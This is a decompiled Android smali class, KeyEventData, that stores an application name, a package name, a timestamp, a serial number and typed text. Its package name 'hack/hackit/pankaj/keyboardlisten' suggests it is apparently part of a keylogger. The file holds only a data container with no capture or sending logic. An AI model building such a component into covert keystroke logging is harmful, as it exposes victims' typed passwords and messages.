.class public Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
.super Ljava/lang/Object;
.source "KeyEventData.java"


# instance fields
.field private AppDateTime:Ljava/lang/String;

.field private AppPackageName:Ljava/lang/String;

.field private ApplicationName:Ljava/lang/String;

.field private SrNo:J

.field private TypedText:Ljava/lang/String;


# direct methods
.method constructor <init>()V
    .locals 0

    .prologue
    .line 18
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method constructor <init>(JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .param p1, "srNo"    # J
    .param p3, "ApplicationName"    # Ljava/lang/String;
    .param p4, "AppDateTime"    # Ljava/lang/String;
    .param p5, "TypedText"    # Ljava/lang/String;

    .prologue
    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 28
    iput-object p3, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->ApplicationName:Ljava/lang/String;

    .line 29
    iput-object p5, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->TypedText:Ljava/lang/String;

    .line 30
    iput-wide p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->SrNo:J

    .line 31
    iput-object p4, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->AppDateTime:Ljava/lang/String;

    .line 32
    return-void
.end method

.method constructor <init>(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "ApplicationName"    # Ljava/lang/String;
    .param p2, "TypedText"    # Ljava/lang/String;

    .prologue
    .line 21
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 22
    iput-object p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->ApplicationName:Ljava/lang/String;

    .line 23
    iput-object p2, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->TypedText:Ljava/lang/String;

    .line 24
    return-void
.end method

.method constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "ApplicationName"    # Ljava/lang/String;
    .param p2, "AppDateTime"    # Ljava/lang/String;
    .param p3, "TypedText"    # Ljava/lang/String;

    .prologue
    .line 35
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 36
    iput-object p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->ApplicationName:Ljava/lang/String;

    .line 37
    iput-object p3, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->TypedText:Ljava/lang/String;

    .line 38
    iput-object p2, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->AppDateTime:Ljava/lang/String;

    .line 39
    return-void
.end method

.method constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "ApplicationName"    # Ljava/lang/String;
    .param p2, "AppDateTime"    # Ljava/lang/String;
    .param p3, "TypedText"    # Ljava/lang/String;
    .param p4, "AppPackageName"    # Ljava/lang/String;

    .prologue
    .line 42
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 43
    iput-object p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->ApplicationName:Ljava/lang/String;

    .line 44
    iput-object p3, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->TypedText:Ljava/lang/String;

    .line 45
    iput-object p2, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->AppDateTime:Ljava/lang/String;

    .line 46
    iput-object p4, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->AppPackageName:Ljava/lang/String;

    .line 47
    return-void
.end method


# virtual methods
.method public getAppPackageName()Ljava/lang/String;
    .locals 1

    .prologue
    .line 103
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->AppPackageName:Ljava/lang/String;

    return-object v0
.end method

.method public getDateTime()Ljava/lang/String;
    .locals 4

    .prologue
    .line 97
    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v2, "yyyy-MM-dd HH:mm:ss"

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-direct {v1, v2, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    .line 98
    .local v1, "dateFormat":Ljava/text/SimpleDateFormat;
    new-instance v0, Ljava/util/Date;

    invoke-direct {v0}, Ljava/util/Date;-><init>()V

    .line 99
    .local v0, "date":Ljava/util/Date;
    invoke-virtual {v1, v0}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v2

    return-object v2
.end method

.method public get_AppDateTime()Ljava/lang/String;
    .locals 1

    .prologue
    .line 93
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->AppDateTime:Ljava/lang/String;

    return-object v0
.end method

.method public get_ApplicationName()Ljava/lang/String;
    .locals 1

    .prologue
    .line 82
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->ApplicationName:Ljava/lang/String;

    return-object v0
.end method

.method public get_SrNo()J
    .locals 2

    .prologue
    .line 77
    iget-wide v0, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->SrNo:J

    return-wide v0
.end method

.method public get_TypedText()Ljava/lang/String;
    .locals 1

    .prologue
    .line 87
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->TypedText:Ljava/lang/String;

    return-object v0
.end method

.method public set_AppDateTime(Ljava/lang/String;)V
    .locals 0
    .param p1, "AppDateTime"    # Ljava/lang/String;

    .prologue
    .line 69
    iput-object p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->AppDateTime:Ljava/lang/String;

    .line 70
    return-void
.end method

.method public set_AppPackageName(Ljava/lang/String;)V
    .locals 0
    .param p1, "appPackageName"    # Ljava/lang/String;

    .prologue
    .line 54
    iput-object p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->AppPackageName:Ljava/lang/String;

    .line 55
    return-void
.end method

.method public set_ApplicationName(Ljava/lang/String;)V
    .locals 0
    .param p1, "ApplicationName"    # Ljava/lang/String;

    .prologue
    .line 50
    iput-object p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->ApplicationName:Ljava/lang/String;

    .line 51
    return-void
.end method

.method public set_SrNo(J)V
    .locals 1
    .param p1, "SrNo"    # J

    .prologue
    .line 64
    iput-wide p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->SrNo:J

    .line 65
    return-void
.end method

.method public set_TypedText(Ljava/lang/String;)V
    .locals 0
    .param p1, "TypedText"    # Ljava/lang/String;

    .prologue
    .line 59
    iput-object p1, p0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->TypedText:Ljava/lang/String;

    .line 60
    return-void
.end method
